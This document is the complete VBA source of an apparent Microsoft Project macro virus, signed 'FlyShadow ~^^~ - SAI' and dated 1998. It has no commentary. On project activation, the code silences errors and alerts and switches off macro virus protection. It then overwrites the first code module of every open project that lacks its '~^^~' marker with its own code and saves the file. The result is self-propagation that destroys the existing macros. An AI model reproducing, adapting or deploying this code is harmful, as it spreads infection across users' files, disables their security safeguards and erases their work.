'Copyright (C) 1998 by FlyShadow ~^^~ - SAI
Private Sub Project_Activate(ByVal pj As Project)
On Error Resume Next
Application.DisplayAlerts = 0
Application.MacroVirusProtection = 0
With ThisProject.VBProject.VBComponents(1).CodeModule
£o = .Lines(1, .CountOfLines): End With
For Each £d In Projects
Set £\ = £d.VBProject.VBComponents(1).CodeModule
If £\.Find("~^^~", 0, 0, 0, 0) = 0 Then
£\.DeleteLines 1, £\.CountOfLines
£\.InsertLines 1, £o
Application.FileSaveAs Name:=ActiveProject.Name
End If: Next: End Sub